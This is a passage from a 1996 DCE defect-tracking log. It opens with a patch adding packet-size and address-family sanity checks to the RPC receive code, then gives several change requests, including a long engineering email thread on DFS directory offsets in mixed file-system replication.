      rpc__dg_convc_indy(&cas_uuid);
  }
  
  
  /*
   * R E C V _ P K T
***************
*** 1851,1856 ****
--- 1873,1894 ----
       * checksumming), copy the header out if the boot time is zero.
       */
  
+ 
+     /* Another minor sanity check. If this packet length is less
+      * than the sizeof header, we have a problem. Lets avoid it - nb
+      */
+     if ( rqe->pkt_len < sizeof(rqe->hdr) ) {
+         RPC_DBG_GPRINTF(("(recv_pkt) pkt size (%d) too small \n", 
+ 				rqe->pkt_len));
+         rqe->frag_len = 0;
+         rqe->hdrp = NULL;
+         return (0);
+     }
+ 
      rqe->hdrp = (rpc_dg_pkt_hdr_p_t) &rqe->pkt->hdr;
  
      if (NDR_DREP_INT_REP(rqe->hdrp->drep) != ndr_g_local_drep.int_rep)
***************
*** 1895,1900 ****
--- 1933,1939 ----
  
      if (fwd)
      {
+ 
          /*
           * Clear forwarding bits in packets that shouldn't have them.  Pre-2.0
           * systems accidentally set them as a result of initializing its
***************
*** 1925,1930 ****
--- 1964,2010 ----
               * request packet processing handle them.  (All two-packet
               * forwards are requests.)
               */
          }
  
          else 
***************
*** 1934,1950 ****
--- 2014,2064 ----
              unsigned16 i, j;
              unsigned16 fwd_len;
          
+ 	/* Another sanity check. If this packet length is less
+      	 * than the sizeof fhdr, we have a problem. Lets avoid it - nb
+      	 */
+     	if ( rqe->pkt_len < 
+ 		  (sizeof(rpc_dg_pkt_hdr_t)+sizeof(rpc_dg_fpkt_hdr_t))) {
+         	RPC_DBG_GPRINTF(("(recv_pkt) forwarded pkt size (%d) too small \n", 
+ 					rqe->pkt_len));
+         	rqe->frag_len = 0;
+         	rqe->hdrp = NULL;
+         	return (0);
+     	}
              /*
               * Jam the source address and drep from the top of the body into
               * the right places, then slide the real body up.  The proceed
               * as if none of this nightmare had happened.
               */
  
              rqe->from.len = fpkt->fhdr.len;
              *sp = fpkt->fhdr.addr;
              rqe->hdrp->drep[0] = fpkt->fhdr.drep[0];
              rqe->hdrp->drep[1] = fpkt->fhdr.drep[1];
              rqe->hdrp->drep[2] = fpkt->fhdr.drep[2];
              fwd_len = rqe->pkt_len - 
                  (RPC_C_DG_RAW_PKT_HDR_SIZE + sizeof(rpc_dg_fpkt_hdr_t));
              rqe->frag_len -= sizeof(rpc_dg_fpkt_hdr_t);
***************
*** 1965,1971 ****
--- 2079,2139 ----
  
              rqe->pkt->hdr.hdr[RPC_C_DG_RPHO_FLAGS] &= ~RPC_C_DG_PF_FORWARDED;
          }
+ 
+     /* NOTE:
+ 	    Forwarded packets must be local. We must guard against
+ 	    some one sending us a bad forwarded packet that can
+ 	    have us branch off into oblivion by feeding us bad
+ 	    naf_id. In order to do this, it would be nice if
+ 	    naf implementation(comnaf) provided a way to verify
+ 	    if the address is local. To my knowledge that does
+ 	    not exist. Here we fix it quick and dirty but will
+ 	    make us impermeable to this kind of attack. - nb
+ 	 */
+     if (fwd) {  
+        struct sockaddr *sp;
+ 
+ 	 sp = (RPC_DG_HDR_FLAG2_IS_SET(rqe->hdrp, RPC_C_DG_PF2_FORWARDED_2))?
+ 		&(((rpc_dg_fpkt_p_t)rqe->pkt)->fhdr.addr)
+ 	 		:(struct sockaddr *) &rqe->from.sa;
+ 	if (
+ #ifdef NAF_IP
+ 		(sp->sa_family != RPC_C_NAF_ID_IP) &&
+ #endif
+ #ifdef NAF_NS
+ 		(sp->sa_family != RPC_C_NAF_ID_NS) &&
+ #endif
+ #ifdef NAF_DNET
+ 		(sp->sa_family != RPC_C_NAF_ID_DNET) &&
+ #endif
+ #ifdef NAF_DDS
+ 		(sp->sa_family != RPC_C_NAF_ID_DDS) &&
+ #endif
+ #ifdef NAF_OSI
+ 		(sp->sa_family != RPC_C_NAF_ID_OSI) &&
+ #endif
+ 	       1 /*For syntax*/
+ 		) {
+         	RPC_DBG_GPRINTF(("(recv_pkt) Bad address family(%d)\n", 
+ 					sp->sa_family));
+         	rqe->frag_len = 0;
+         	rqe->hdrp = NULL;
+         	return (0);
+          }
+ 	 /* Verify address is local. Excercise for the reader ...
+ 	    To be implemented.
+ 	  */
      }
+ 
  
      if (! fwd && recv_len < (rqe->hdrp->len + RPC_C_DG_RAW_PKT_HDR_SIZE))
      {

--=====================_830209947==_
Content-Type: text/plain; charset="us-ascii"


-----------------------------------------------------------

[9/26/96 public]

OT 13631- bad packets crash servers  is probably dup. Added to
inter-dependent CR's pending further investigation.

[10/10/96 public]

Fixed in 1.1 maintenance.



CR Number                     : 13487
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : 
Short Description             : DFS directory offsets are not interoperable (e.g. between Episode and other LFS's).
Reported Date                 : 5/30/96
Found in Baseline             : 1.2.1
Found Date                    : 5/30/96
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/30/96 public]

The problem arises when trying to support transparent fileset
replication or movement between dissimilar local file systems.  The
local file systems could be either current Episode with later versions
of Episode (if the directory offset calculation changes for, e.g.
efficiency reasons), or current Episode with a different local file
system.  I have included a bunch of discussion below.  The gist of it is
that some client changes can ameliorate, but not solve, the problem.  To
really solve the problem will require more study, and possibly, protocol
changes.  A complete solution may not even be possible.

================================================================================
At 05:01 PM 5/14/96 -0400, Craig_Everhart@transarc.com wrote:

>Excerpts from mail: 10-May-96 Re: Urgent: Do we want this Vikram Biyani (1879*)
>
>> Also we need to get some resolution about filesystem dependent directory
>> offsets. When we have file systems other that Episode that we want to interop
>> with as replication sites, there needs to be a common form of DFS "directory
>> offsets". Today the offsets are those supplied by the filesystem that the
>> file is read from. If there is an Episode and a non-Episode file server in
>> the replication group for a particular fileset, the directory offsets will
>> not be the same.
>
>I think that the DFS CM can handle different offsets for fileset motion
>but probably not for replication (where successive AFS_Readdir() calls
>can be directed alternately to different file servers).  I admit that
>it's not a situation that we ever expected to arise, though there's at
>least one handle on directory offsets in the fileset-dump format.  (Each
>directory entry comes with a preferred offset value that the restorer
>can ideally use for the given entry.)  It's conceivable that one could
>also try to make the CM do successive AFS_Readdir() calls from the same
>file server.
>
>Have you had any thoughts about the issue?

2 thoughts -

1) Have th CM do suceesive AFS_Readdir() calls from the same file server and
have the CM flush cached directory entries if the server site changes.

2) Define a filesystem independant 'index' instead of a block offset for the
   protocol parts that now use the dir offset.

I think that we need to address this ASAP. Both HP and Digital are going to
be having non-Episode LFS's soon and this problem of interop will surface.

================================================================================
At 01:03 PM 5/15/96 -0400, Craig_Everhart@transarc.com wrote:

>Excerpts from mail: 15-May-96 Re: ``directory offset'' issue John
>Brezak@apollo.hp.co (1716*)
>
>> 1) Have th CM do suceesive AFS_Readdir() calls from the same file server and
>> have the CM flush cached directory entries if the server site changes.
>
>I can imagine doing something like this by maintaining a source server
>pointer along with the directory offset-to-chunk cache.

This would be a good "stop gap" measure for now. Should this issue be made into
an OT ?

>
>> 2) Define a filesystem independant 'index' instead of a block offset for the
>>    protocol parts that now use the dir offset.
>
>Would you like to elaborate on this?

(Daryl, can you comment ?)

>
>Separately, I explored the preserve-directory-offsets flag use in DFS
>and it looks like directory offsets should already be being preserved if
>the filesystem types are the same, or if the restore-procedure caller is
>asking for them to be preserved by an appropriate flag field to the
>vols_RestoreVolume call, which in the ftserver is ultimately derived
>from a flag passed to FTSERVER_Restore() or FTSERVER_Forward().  And the
>``filesystem type'' is different for Episode and other LFS
>implementations.  (I wish I knew the numeric value that the DEC guys
>might be planning on using.)

I don't think preserving the offsets will work. Basically offsets are tied
to the filesystem implementation. I can't see why a filesystem has to be
able to use specified dir offsets. Each filesystem should be using the offsets
that is most efficient for its implementation.

>
>While I think that the CM should (*should*) be handling itself OK for
>fileset moves, it currently has problems for fileset replication across
>different filesystem types.  Another class of solution is to insist on
>offset-preservation for replication, which could be done by having the
>repserver specify FTSERVER_RESTORE_FORCE_PRESERVE in the
>FTSERVER_Forward() call that it makes.  Do other LFS implementations
>honor the preserveOffsets parameter to the VOL_APPENDDIR operation?
>
We looked at this, but can't guarantee being able to preserve the offsets. I
don't think Episode could do this either. Again the filesystem's implementation
dictates how it wants to store directory entries. The offset is really private
to the filesystem. Out problem is how to associate a filesystem independent
directory "index" with a filesystem dependent offset.


>		Craig
>

================================================================================
Excerpts from mail: 15-May-96 Re: ``directory offset'' issue John
Brezak@apollo.hp.co (2475*)

> >I can imagine doing something like this by maintaining a source server
> >pointer along with the directory offset-to-chunk cache.

> This would be a good "stop gap" measure for now. Should this issue be made into
> an OT ?

Why is it a stop-gap?  I don't know how to implement it fully; that was
just a tiny part of an answer.  I wouldn't know how to test an
implementation that I had, either.

Also, if it's intended as a stop-gap, how will the CM ever find out that
it doesn't have to do it any more?

> >and it looks like directory offsets should already be being preserved if
> >the filesystem types are the same, or if the restore-procedure caller is
> >asking for them to be preserved by an appropriate flag field to the
> >vols_RestoreVolume call, which in the ftserver is ultimately derived
> >from a flag passed to FTSERVER_Restore() or FTSERVER_Forward().  And the
> >``filesystem type'' is different for Episode and other LFS
> >implementations.  (I wish I knew the numeric value that the DEC guys
> >might be planning on using.)

> I don't think preserving the offsets will work. Basically offsets are tied
> to the filesystem implementation. I can't see why a filesystem has to be
> able to use specified dir offsets. Each filesystem should be using the offsets
> that is most efficient for its implementation.

The idea behind the preserveOffset flag is that if the FS can't do the
restoration of the given directory entry at the given offset, the
restoration should fail.  Episode can't store names at arbitrary
offsets, but it will fail if it's being asked to store at a given point
and cannot.  Do the other LFS's you know about obey this flag in the
same way?

The point is that they should be doing so, in which case there's an
additional choice about how to fix the problem: to have all replicas for
a given fileset either be on the same filesystem type or on filesystems
that can use the incoming offset number.

I don't know what you mean when you claim that each filesystem
``should'' be using its own most-efficient offsets.  In particular, I'm
not sure that it helps to resolve the problem.

Do you know whether restores to other LFSs will fail if preserveOffsets
is requested and cannot be honored?

> Out problem is how to associate a filesystem independent
> directory "index" with a filesystem dependent offset.

Is this ``our'' and not ``out''?

I'm still wondering what the index has to do with.

There has to be a relationship between the offsets/cookies passed
through the system calls on the clients and in the directory data and
the embedded cookies as passed from server filesystem through exporter
through client through client system call.  We worked pretty hard to
come up with a filesystem-independent, yet consistent, representation of
all this and basically came up empty, which is why we're currently using
cookies pretty much straight from the server filesystem.

		Craig

================================================================================
At 03:12 PM 5/15/96 -0400, Craig_Everhart@transarc.com wrote:

>Excerpts from mail: 15-May-96 Re: ``directory offset'' issue John
>Brezak@apollo.hp.co (2475*)
>
>> >I can imagine doing something like this by maintaining a source server
>> >pointer along with the directory offset-to-chunk cache.
>
>> This would be a good "stop gap" measure for now. Should this issue be made into
>> an OT ?
>
>Why is it a stop-gap?  I don't know how to implement it fully; that was
>just a tiny part of an answer.  I wouldn't know how to test an
>implementation that I had, either.
>
>Also, if it's intended as a stop-gap, how will the CM ever find out that
>it doesn't have to do it any more?

I consider it "stop gap" in that it will fix most of the effects of the problem.
However it doesn't really fix the problem. Maybe this is all we can do.

>
>> >and it looks like directory offsets should already be being preserved if
>> >the filesystem types are the same, or if the restore-procedure caller is
>> >asking for them to be preserved by an appropriate flag field to the
>> >vols_RestoreVolume call, which in the ftserver is ultimately derived
>> >from a flag passed to FTSERVER_Restore() or FTSERVER_Forward().  And the
>> >``filesystem type'' is different for Episode and other LFS
>> >implementations.  (I wish I knew the numeric value that the DEC guys
>> >might be planning on using.)
>
>> I don't think preserving the offsets will work. Basically offsets are tied
>> to the filesystem implementation. I can't see why a filesystem has to be
>> able to use specified dir offsets. Each filesystem should be using the offsets
>> that is most efficient for its implementation.
>
>The idea behind the preserveOffset flag is that if the FS can't do the
>restoration of the given directory entry at the given offset, the
>restoration should fail.  Episode can't store names at arbitrary
>offsets, but it will fail if it's being asked to store at a given point
>and cannot.  Do the other LFS's you know about obey this flag in the
>same way?

We obey the flag in this way. However, this means that you can't have fileset
replica's between heterogenous aggregates.

>
>The point is that they should be doing so, in which case there's an
>additional choice about how to fix the problem: to have all replicas for
>a given fileset either be on the same filesystem type or on filesystems
>that can use the incoming offset number.

Are customers happy with that constraint ? Also how can the admin know what
will work and what won't without trying it first ?

>
>I don't know what you mean when you claim that each filesystem
>``should'' be using its own most-efficient offsets.  In particular, I'm
>not sure that it helps to resolve the problem.

It doesn't solve the problem, it is at the root of the problem.

>
>Do you know whether restores to other LFSs will fail if preserveOffsets
>is requested and cannot be honored?

I don't know. What is the behavior with fts in this regard ?

>
>> Out problem is how to associate a filesystem independent
>> directory "index" with a filesystem dependent offset.
>
>Is this ``our'' and not ``out''?
Right - "our".

>
>I'm still wondering what the index has to do with.

The idea is to use an index into a block instead of a offset. The index
would represent the 1st dir entry, 2nd dir entry, ... nth dir entry. The
filesystem needs to map these indicies into the native offsets.

>
>There has to be a relationship between the offsets/cookies passed
>through the system calls on the clients and in the directory data and
>the embedded cookies as passed from server filesystem through exporter
>through client through client system call.  We worked pretty hard to
>come up with a filesystem-independent, yet consistent, representation of
>all this and basically came up empty, which is why we're currently using
>cookies pretty much straight from the server filesystem.

I agree completely. We've been mulling over this for some time too. Maybe
the best we can do is change the CM as proposed and allow for the possibility
that you can't mix aggr types in fileset replication groups and moves may
fail.

BTW- Is the Episode dir offset specified ? One problem in using the Episode
offsets has been the lack of knowledge about how they are calculated. Having
this knowledge in the VFS+ spec might help with interop.

>
>		Craig
>

((No, I don't think that customers would be all that happy to deal with
what would probably appear weird new restrictions on replication.))

================================================================================
Excerpts from mail: 16-May-96 Re: ``directory offset'' issue John
Brezak@apollo.hp.co (4352*)

> >Do you know whether restores to other LFSs will fail if preserveOffsets
> >is requested and cannot be honored?

> I don't know. What is the behavior with fts in this regard ?

The behavior is that restorations will fail with EINVAL, since that's
the error code returned from the failing VOL_APPENDDIR op.  There's no
way at present to get fts to insist on directory offset matching with a
restoration.  One could override it by hand-editing a dump stream so
that the aggregate type that it says it was dumped from is the same as
the aggregate type to which it will be restored.  Dump restoration will
compare these two aggregate types and ask for preserve-offsets behavior
if they match.

> Maybe
> the best we can do is change the CM as proposed and allow for the possibility
> that you can't mix aggr types in fileset replication groups and moves may
> fail.

Actually, the CM is designed to handle directory representation changes
when fileset moves occur, but not to handle it for replica fail-over. 
That's why I was suggesting that replication could insist on matching
dir offsets, but not that fileset moves would insist on matching dir
offsets.

Directory offsets aren't discussed in the protocol for any really
excellent reason, except that if a dump&restore pair can't keep them the
same, then directory enumeration will screw up in replica fallover. 
There's nothing particularly sacred about the Episode offset numbers. 
With the original design, it's just a bug that we forgot to close the
loop and make the repserver insist on constant offset values between
replicas (with the R/W, in this suggestion).  Of course, you're now
sensibly arguing that implementing that design would seem like the
imposition of unnatural restrictions.

> BTW- Is the Episode dir offset specified ? One problem in using the Episode
> offsets has been the lack of knowledge about how they are calculated. Having
> this knowledge in the VFS+ spec might help with interop.

I believe that they're just the (byte) offset in the directory, as if
the directory enumeration had started or stopped there.  It's just the
cookie value.

		Craig

================================================================================
Craig Everhart writes:
    ....
> Actually, the CM is designed to handle directory representation changes
> when fileset moves occur, but not to handle it for replica fail-over. 
> That's why I was suggesting that replication could insist on matching
> dir offsets, but not that fileset moves would insist on matching dir
> offsets.
> 
> Directory offsets aren't discussed in the protocol for any really
> excellent reason, except that if a dump&restore pair can't keep them the
> same, then directory enumeration will screw up in replica fallover. 
> There's nothing particularly sacred about the Episode offset numbers. 
> With the original design, it's just a bug that we forgot to close the
> loop and make the repserver insist on constant offset values between
> replicas (with the R/W, in this suggestion).  Of course, you're now
> sensibly arguing that implementing that design would seem like the
> imposition of unnatural restrictions.
> 
> > BTW- Is the Episode dir offset specified ? One problem in using the Episode
> > offsets has been the lack of knowledge about how they are calculated. Having
> > this knowledge in the VFS+ spec might help with interop.
> 
> I believe that they're just the (byte) offset in the directory, as if
> the directory enumeration had started or stopped there.  It's just the
> cookie value.

I'm jumping in because I thought I understood the problem, but the
recent traffic leads me to believe my understanding isn't quite right.
Let's go back to real basics here...Some application program is calling
getdirentries() (possibly along with lseek()), or the
opendir()/readdir()/... series.  In either case, a "cookie" representing
the current position in the directory is being returned to the caller
(e.g. telldir()) or stored in the directory stream info.  There are
POSIX defined constraints on how this cookie can be used, e.g. you can
only feed seekdir() a cookie obtained from telldir(), or you can only
feed lseek() a cookie you got from a previous lseek() or from
getdirentries().  Furthermore, you can keep feeding in cookies obtained
from previous calls to iterate through all the entries in a directory.
I don't know if POSIX guarantees that you will see all the entries
exactly once, but I suspect it can't since someone could delete entries
after you started.

Now the problem, as I understand it, is that the cookie the cm returns
to the caller in an LFS directory is the actual byte offset that Episode
uses for that dir entry.  That is, when the cookie gets back to Episode,
it just uses it as a byte offset to find the entry.  It seems clear to
me that some other file systems might want the cookie to be a B-tree
index, or a hash table index, or some other kind of offset that makes
sense for the way they store directory entries.  Thus, there will always
be a problem if the cookie comes from one fs type and is presented to
another fs type.

I don't see why the solution is not to just use a "canonical" cookie in
dfs (in the protocol) and let each fs type interpret the cookie
appropriately.  Now, it may turn out that the Episode cookies are stable
enough to be used as the canonical cookie.  In that case, we need to
know exactly how they are generated and that the algorithim to generate
them won't change in the next release (i.e. they should be specified in
the VFS+ spec).  Otherwise, we should figure out some other canonical
cookie, e.g. an index based on file creation time, or alphabetical
order, or something.

As I said, it seems fairly simple to me, so I assume I don't understand
something important.

 -- Rick

================================================================================
At 01:58 PM 5/16/96 -0400, Craig_Everhart@transarc.com wrote:

>((No, I don't think that customers would be all that happy to deal with
>what would probably appear weird new restrictions on replication.))
>
>Excerpts from mail: 16-May-96 Re: ``directory offset'' issue John
>Brezak@apollo.hp.co (4352*)
>
>> >Do you know whether restores to other LFSs will fail if preserveOffsets
>> >is requested and cannot be honored?
>
>> I don't know. What is the behavior with fts in this regard ?
>
>The behavior is that restorations will fail with EINVAL, since that's
>the error code returned from the failing VOL_APPENDDIR op.  There's no
>way at present to get fts to insist on directory offset matching with a
>restoration.  One could override it by hand-editing a dump stream so
>that the aggregate type that it says it was dumped from is the same as
>the aggregate type to which it will be restored.  Dump restoration will
>compare these two aggregate types and ask for preserve-offsets behavior
>if they match.

Ok, so let see if I understand this -

- fts dump, restore and move do NOT require preserved offsets and should work
        between EFS aggrs of different type.
- replication seems to be the only case where preserved offsets matter.

This seems to be fine. The only problem is with replication then. I don't see
a need to extend the problem space to cover dump/restore related activities.

>
>> Maybe
>> the best we can do is change the CM as proposed and allow for the possibility
>> that you can't mix aggr types in fileset replication groups and moves may
>> fail.
>
>Actually, the CM is designed to handle directory representation changes
>when fileset moves occur, but not to handle it for replica fail-over. 
>That's why I was suggesting that replication could insist on matching
>dir offsets, but not that fileset moves would insist on matching dir
>offsets.

Agreed. However if we change the CM to have replica affinity for directory
reads and flush cached directory entries on rebind to a new server.

>
>Directory offsets aren't discussed in the protocol for any really
>excellent reason, except that if a dump&restore pair can't keep them the
>same, then directory enumeration will screw up in replica fallover. 
>There's nothing particularly sacred about the Episode offset numbers. 
>With the original design, it's just a bug that we forgot to close the
>loop and make the repserver insist on constant offset values between
>replicas (with the R/W, in this suggestion).  Of course, you're now
>sensibly arguing that implementing that design would seem like the
>imposition of unnatural restrictions.

If the repserver currently doesn't use the preserve offsets behavior, then
there will be a problem without the CM changes. I'm not so sure that changing
the repserver to use this is right given what we know now.

>
>> BTW- Is the Episode dir offset specified ? One problem in using the Episode
>> offsets has been the lack of knowledge about how they are calculated. Having
>> this knowledge in the VFS+ spec might help with interop.
>
>I believe that they're just the (byte) offset in the directory, as if
>the directory enumeration had started or stopped there.  It's just the
>cookie value.

Right. If we can come up with a way to mix different aggr types in replication
groups, then the a "standard neutral" offset becomes moot. If not, then a
filesystem should be using the Epsiode offsets to guarantee mixing of aggr
types. In this case the exact semantics should be doucmented. I'm looking for
block boundries, reuse of old entries, etc...

>
>		Craig
>

================================================================================
Excerpts from mail: 16-May-96 Re: ``directory offset'' issue John
Brezak@apollo.hp.co (3586*)

> - fts dump, restore and move do NOT require preserved offsets and should work
>         between EFS aggrs of different type.
> - replication seems to be the only case where preserved offsets matter.

> This seems to be fine. The only problem is with replication then. I don't see
> a need to extend the problem space to cover dump/restore related activities.

Right.  Of course, replication is constructed out of dump and restore,
and it's restoration that is the process that verifies the dir-offsets
saved from dump time.

> If the repserver currently doesn't use the preserve offsets behavior, then
> there will be a problem without the CM changes. I'm not so sure that changing
> the repserver to use this is right given what we know now.

This is probably right.  I think that we (all of us) could put out a
repserver patch to insist on offset matches along with any releases of a
new LFS, but that's probably the last moment.

Pushing on some CM affinity seems like a reasonable strategy.  I haven't
looked to see how messy that is to do in any bulletproof fashion.

		Craig

================================================================================
At 04:43 PM 5/16/96 -0400, Craig_Everhart@transarc.com wrote:

>Excerpts from mail: 16-May-96 Re: ``directory offset'' issue John
>Brezak@apollo.hp.co (3586*)
>
>> - fts dump, restore and move do NOT require preserved offsets and should work
>>         between EFS aggrs of different type.
>> - replication seems to be the only case where preserved offsets matter.
>
>> This seems to be fine. The only problem is with replication then. I don't see
>> a need to extend the problem space to cover dump/restore related activities.
>
>Right.  Of course, replication is constructed out of dump and restore,
>and it's restoration that is the process that verifies the dir-offsets
>saved from dump time.

My understanding at this point is the the repserver uses the restore operation
and (should be) specifying the preserve offsets flag to the appenddir
VOL_OP. The others (fts move and restore) should NOT. Right ?

>
>> If the repserver currently doesn't use the preserve offsets behavior, then
>> there will be a problem without the CM changes. I'm not so sure that changing
>> the repserver to use this is right given what we know now.
>
>This is probably right.  I think that we (all of us) could put out a
>repserver patch to insist on offset matches along with any releases of a
>new LFS, but that's probably the last moment.

But if the CM is changed, then the repserver shouldn't force preserve offsets
because they can be different from different replicas. Or am I not understanding
something here ?

I also understand that the current repserver isn't using the preserve offsets
flag to the VOL_APPENDDIR() operation. This was originally considered a defect,
but now it would enable the mixed aggr case - as long as the CM was changed.

>
>Pushing on some CM affinity seems like a reasonable strategy.  I haven't
>looked to see how messy that is to do in any bulletproof fashion.

Is there time to look at this for DCE 1.2.2 ?

>
>		Craig
>

================================================================================
Excerpts from mail: 16-May-96 Re: ``directory offset'' issue John
Brezak@apollo.hp.co (1944*)

> >Right.  Of course, replication is constructed out of dump and restore,
> >and it's restoration that is the process that verifies the dir-offsets
> >saved from dump time.

> My understanding at this point is the the repserver uses the restore operation
> and (should be) specifying the preserve offsets flag to the appenddir
> VOL_OP. The others (fts move and restore) should NOT. Right ?

> >
> >> If the repserver currently doesn't use the preserve offsets behavior, then
> >> there will be a problem without the CM changes. I'm not so sure that
> changing
> >> the repserver to use this is right given what we know now.
> >
> >This is probably right.  I think that we (all of us) could put out a
> >repserver patch to insist on offset matches along with any releases of a
> >new LFS, but that's probably the last moment.

> But if the CM is changed, then the repserver shouldn't force preserve offsets
> because they can be different from different replicas. Or am I not
> understanding
> something here ?

> I also understand that the current repserver isn't using the preserve offsets
> flag to the VOL_APPENDDIR() operation. This was originally considered a defect,
but now it would enable the mixed aggr case - as long as the CM was changed.

Yup--I completely agree with this.  The original idea--at least in
rational reconstruction or 20/20 hindsight--was that replication would
work only between same-architecture EFS's, and this would be enforced by
having replica propagation insist on matching directory offsets in
replicas.  But we can now recognize that this may impose a substantial
cost to administrators who might want to mix-and-match different EFS
internal architectures when they choose sets of servers on which they
want to replicate filesets.

I had another idea for solving the problem: have some way for the CM to
use an architecture tag (i.e. brand of directory offset) for the kind of
EFS that's being used.  (Using the existing 32-bit aggregate type seems
like a good possibility here; maybe this value could be returned as part
of the afsFetchStatus structure.)  The CM wouldn't have to flush its
directory data/offset cache (and whatever else) if replica fail-over
fell over into a server with the same architecture as what it had cached
already.  (And offsets are already being guaranteed as compatible based
on this aggregate type.)

Also, CMs choose between replicas pretty freely; they don't have to
stick to one replica until it fails.  Instead, for each RPC call, they
choose the replica that responds the fastest among the ones that look
nearest in network/server-preference space.  So if you had a big
directory you were enumerating, and made lots of AFS_Readdir calls to
get data from it, it's easy to imagine that you could make a few calls
to one server, make a few calls to another, and so on.  If you had to
flush your data and restart the enumeration every time the automatic
fail-over happened as at present, this could be gratuitously expensive. 
Instead, I think this ``affinity'' we've been talking about would have
to involve some new functionality at low levels of the CM at which this
choice of server is made.

> >Pushing on some CM affinity seems like a reasonable strategy.  I haven't
> >looked to see how messy that is to do in any bulletproof fashion.

> Is there time to look at this for DCE 1.2.2 ?

Good question, and not a question for me, but for management both at
Transarc and possibly at HP (you didn't say who would be doing the
looking, after all).  Also, Transarc would have a tough time doing any
testing of such a facility if it has access to only one EFS
implementation, for which dir offsets are preserved.

		Craig

================================================================================
At 10:30 AM 5/17/96 -0400, you wrote:

>Excerpts from mail: 16-May-96 Re: ``directory offset'' issue John
>Brezak@apollo.hp.co (1944*)
>
>> >Right.  Of course, replication is constructed out of dump and restore,
>> >and it's restoration that is the process that verifies the dir-offsets
>> >saved from dump time.
>
>> My understanding at this point is the the repserver uses the restore operation
>> and (should be) specifying the preserve offsets flag to the appenddir
>> VOL_OP. The others (fts move and restore) should NOT. Right ?
>
>> >
>> >> If the repserver currently doesn't use the preserve offsets behavior, then
>> >> there will be a problem without the CM changes. I'm not so sure that changing
>> >> the repserver to use this is right given what we know now.
>> >
>> >This is probably right.  I think that we (all of us) could put out a
>> >repserver patch to insist on offset matches along with any releases of a
>> >new LFS, but that's probably the last moment.
>
>> But if the CM is changed, then the repserver shouldn't force preserve offsets
>> because they can be different from different replicas. Or am I not
>> understanding
>> something here ?
>
>> I also understand that the current repserver isn't using the preserve offsets
>> flag to the VOL_APPENDDIR() operation. This was originally considered a defect,
>but now it would enable the mixed aggr case - as long as the CM was changed.
>
>Yup--I completely agree with this.  The original idea--at least in
>rational reconstruction or 20/20 hindsight--was that replication would
>work only between same-architecture EFS's, and this would be enforced by
>having replica propagation insist on matching directory offsets in
>replicas.  But we can now recognize that this may impose a substantial
>cost to administrators who might want to mix-and-match different EFS
>internal architectures when they choose sets of servers on which they
>want to replicate filesets.
>
>I had another idea for solving the problem: have some way for the CM to
>use an architecture tag (i.e. brand of directory offset) for the kind of
>EFS that's being used.  (Using the existing 32-bit aggregate type seems
>like a good possibility here; maybe this value could be returned as part
>of the afsFetchStatus structure.)  The CM wouldn't have to flush its
>directory data/offset cache (and whatever else) if replica fail-over
>fell over into a server with the same architecture as what it had cached
>already.  (And offsets are already being guaranteed as compatible based
>on this aggregate type.)
>
>Also, CMs choose between replicas pretty freely; they don't have to
>stick to one replica until it fails.  Instead, for each RPC call, they
>choose the replica that responds the fastest among the ones that look
>nearest in network/server-preference space.  So if you had a big
>directory you were enumerating, and made lots of AFS_Readdir calls to
>get data from it, it's easy to imagine that you could make a few calls
>to one server, make a few calls to another, and so on.  If you had to
>flush your data and restart the enumeration every time the automatic
>fail-over happened as at present, this could be gratuitously expensive. 
>Instead, I think this ``affinity'' we've be[domian 8/1/96]
Changed priority 1 to 2 as recommended by HP.



CR Number                     : 13486
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : doc
Short Description             : sec_rgy_unix_getgr* routines
won't take multiple calls for member list
Reported Date                 : 5/30/96
Found in Baseline             : 1.0.3,1.1
Found Date                    : 5/30/96
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : rca/unix.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/30/96 public]

The documentation for the sec_rgy_unix_getgr*() routines states that if the
number of members in the group exceeds max_num_members, that multiple
calls can be made to the routine to get the remaining entries in the
member list.  However, the API does not contain a member_list
cursor, and in rca/unix.c, the "member_marker" for these routines 
is always initialized to be invalid.  So multiple calls can't work.

This is not just a bug with the code, it's a bug with the API: Unless
there's a member_cursor argument, there's no way for the routines to know
where in the member list to continue returning entries on a subsequent
call.  Presently, you can only get at most max_num_members member entries,
and there is no indication that the number returned in number_members
is less than the total.



CR Number                     : 13483
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : all variables used after TRY/CATCH need to be volatile
Reported Date                 : 
Found in Baseline             : 1.1
Found Date                    : 
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/30/96 public]
In Solaris, and probably other platforms that implement exception
handlers with setjmp/longjmp, all variables referenced after a TRY/CATCH
block need to be declared volatile. Currently, only the variables used
within the CATCH clause are volatile. These changes are in transarc
delta hyer-17886-need-volatile-in-catch.



CR Number                     : 13482
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : CN Associations use creds from free memory
Reported Date                 : 
Found in Baseline             : 1.1
Found Date                    : 
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/30/96 public]
The CN associations make a copy of the callers credentials for
use in authenticating the messages used to manage the association.
Since there is no ref count, the associations are left with pointers
to free memory when the client frees the binding handle or refreshes
the credentials.

Transarc delta hyer-17352-no-seal-auth-errors moves the creds pointer
into a ref counted structure, and adds code to keep track of how many
associations are using a credential. When a reference to a cred is
released, the creds are kept until there are no more references, so
the associations are not left with pointers to free memory when the
